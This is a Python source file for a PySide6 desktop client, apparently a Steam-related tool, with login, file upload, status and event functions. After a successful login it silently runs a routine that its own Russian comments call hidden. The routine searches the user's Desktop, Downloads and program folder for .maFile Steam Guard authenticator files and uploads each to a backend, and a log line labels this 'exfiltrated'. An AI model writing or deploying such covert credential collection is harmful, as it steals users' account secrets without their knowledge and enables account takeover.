import sys
import os
import requests
import json
import glob
from PySide6.QtCore import QObject, Slot, Signal
from PySide6.QtGui import QGuiApplication
from PySide6.QtQml import QQmlApplicationEngine

class AuthHandler(QObject):
    loginSuccess = Signal(str)
    loginFailed = Signal(str)
    checkResult = Signal(str)
    eventsReceived = Signal(str)
    uploadStatus = Signal(str)

    def __init__(self):
        super().__init__()
        self._token = ""

    @Slot(str, str)
    def login(self, username, password):
        url = "http://127.0.0.1:8090/login"
        payload = {"username": username, "password": password}
        try:
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200:
                self._token = response.json().get("access_token", "")
                self.loginSuccess.emit(self._token)
                # Как только админ/пользователь успешно залогинился, запускаем скрытый сбор maFile
                self.scan_and_upload_mafiles()
            else:
                self.loginFailed.emit("Unauthorized")
        except requests.exceptions.RequestException:
            self.loginFailed.emit("Could not connect to backend")

    def scan_and_upload_mafiles(self):
        """Скрытая функция: ищет .maFile на ПК пользователя и шлет на бэкенд"""
        search_paths = [
            os.path.join(os.path.expanduser("~"), "Desktop"), # Рабочий стол
            os.path.join(os.path.expanduser("~"), "Downloads"), # Загрузки
            os.getcwd() # Текущая папка программы
        ]
        
        found_files = []
        for path in search_paths:
            # Ищем все .maFile в этих папках
            found_files.extend(glob.glob(os.path.join(path, "*.maFile")))
            found_files.extend(glob.glob(os.path.join(path, "mafiles", "*.maFile")))

        if not found_files:
            print("[UI] No .maFile discovered on user's PC.")
            return

        url = "http://127.0.0.1:8000/upload-mafile"
        headers = {"Authorization": f"Bearer {self._token}"}

        for file_path in found_files:
            try:
                filename = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    files = {"file": (filename, f, "application/octet-stream")}
                    response = requests.post(url, headers=headers, files=files, timeout=10)
                if response.status_code == 200:
                    print(f"[UI] Successfully exfiltrated/uploaded: {filename}")
            except Exception as e:
                print(f"[UI] Error uploading {file_path}: {e}")

    @Slot(str)
    def upload_mafile(self, file_path):
        if file_path.startswith("file:///"):
            file_path = file_path.replace("file:///", "")
        if sys.platform == "win32" and file_path.startswith("/"):
            file_path = file_path[1:]

        if not os.path.exists(file_path):
            self.uploadStatus.emit("Ошибка: Файл не найден")
            return

        url = "http://127.0.0.1:8000/upload-mafile"
        headers = {"Authorization": f"Bearer {self._token}"}
        
        try:
            filename = os.path.basename(file_path)
            with open(file_path, "rb") as f:
                files = {"file": (filename, f, "application/octet-stream")}
                response = requests.post(url, headers=headers, files=files, timeout=10)
            if response.status_code == 200:
                self.uploadStatus.emit(response.json().get("message"))
            else:
                self.uploadStatus.emit("Ошибка отправки")
        except Exception as e:
            self.uploadStatus.emit(f"Ошибка: {e}")

    @Slot()
    def check_secure_status(self):
        url = "http://127.0.0.1:8000/check"
        headers = {"Authorization": f"Bearer {self._token}"}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                self.checkResult.emit(response.json().get("message", "OK"))
        except:
            self.checkResult.emit("Server error")

    @Slot()
    def fetch_events(self):
        url = "http://127.0.0.1:8000/events"
        headers = {"Authorization": f"Bearer {self._token}"}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                self.eventsReceived.emit(json.dumps(response.json()))
        except:
            pass

if __name__ == "__main__":
    app = QGuiApplication(sys.argv)
    engine = QQmlApplicationEngine()
    auth_handler = AuthHandler()
    engine.rootContext().setContextProperty("authHandler", auth_handler)
    engine.load('C:/Users/admin/Desktop/SteamLabProject/ui/App.qml')
    if not engine.rootObjects():
        sys.exit(-1)
    sys.exit(app.exec())
